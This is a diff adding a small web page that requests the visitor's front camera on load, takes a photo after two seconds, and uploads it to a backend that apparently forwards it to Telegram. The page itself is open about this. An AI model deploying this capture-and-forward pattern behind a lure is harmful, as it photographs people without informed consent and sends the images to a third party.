@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="si">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Auto Selfie → Telegram</title>
+  <style>
+    body{font-family:sans-serif;display:flex;flex-direction:column;align-items:center;padding:20px}
+    video{border-radius:8px;box-shadow:0 6px 18px rgba(0,0,0,0.15)}
+    #status{margin-top:12px}
+  </style>
+</head>
+<body>
+  <h2>Auto Selfie → Telegram</h2>
+  <video id="video" width="360" height="270" autoplay playsinline></video>
+  <canvas id="canvas" width="360" height="270" style="display:none"></canvas>
+  <div id="status">Waiting for camera permission...</div>
+
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    const status = document.getElementById('status');
+
+    // When page loads, request camera immediately
+    async function startAndCapture() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } , audio: false});
+        video.srcObject = stream;
+        status.textContent = 'Camera active — capturing in 2s...';
+
+        // small delay to let camera adjust (2s). You can change 2000 -> smaller/larger.
+        setTimeout(async () => {
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          // stop camera tracks (optional)
+          stream.getTracks().forEach(t => t.stop());
+
+          // get base64
+          const dataUrl = canvas.toDataURL('image/jpeg', 0.9); // jpeg smaller than png
+          status.textContent = 'Captured — uploading...';
+
+          // send to backend endpoint /upload
+          try {
+            const resp = await fetch('/upload', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ image: dataUrl })
+            });
+            const txt = await resp.text();
+            status.textContent = 'Uploaded — Telegram response received.';
+            console.log('Server response:', txt);
+          } catch (e) {
+            status.textContent = 'Upload failed: ' + e.message;
+            console.error(e);
+          }
+        }, 2000);
+
+      } catch (err) {
+        status.textContent = 'Camera permission denied or error: ' + err.message;
+        console.error(err);
+      }
+    }
+
+    // kick off
+    startAndCapture();
+  </script>
+</body>
+  </html>
